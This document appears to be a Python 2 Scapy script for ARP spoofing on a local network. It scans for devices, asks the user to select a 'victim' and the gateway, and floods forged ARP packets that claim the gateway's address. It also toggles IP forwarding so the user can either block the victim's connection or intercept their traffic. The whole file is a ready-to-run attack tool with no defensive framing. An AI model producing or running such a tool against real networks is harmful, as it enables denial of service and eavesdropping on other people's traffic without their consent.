#!/usr/bin/python

from scapy.all import *
import sys
from utils.arpScanner import arp_scan
from utils.network import *
from utils.tools import *
import socket, struct

def get_mac_address():
    """Get your own mac adress"""
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_macs:
        if(mac != "00:00:00:00:00:00"):
            return mac
Timeout=2
def get_default_gateway_linux():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue
            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

def arpSpoofing(target_ip, gateway_ip):
    my_mac = get_mac_address()
    if not my_mac:
        print "Cant get local mac address, quitting"
        sys.exit(1)
    packet = Ether()/ARP(op="who-has",hwsrc=my_mac,psrc=gateway_ip,pdst=target_ip)
    while 1:
        sendp(packet)


my_interface = select_interface()
print("search for devices on the network")
target_list = arp_scan(my_interface)
gateway = get_default_gateway_linux()
if not gateway:
    gateway = select_val(target_list,"Select the gateway:")
target = select_val(target_list,"Please select a victim:")
print "do you want to block the user press n"
print "or you prefer to show what he does press an other key"
answer = raw_input()
forward = open("/proc/sys/net/ipv4/ip_forward", "w")
if answer == "n":
    forward.write("0")
else:
    forward.write("1")
forward.close()
arpSpoofing(target,gateway)
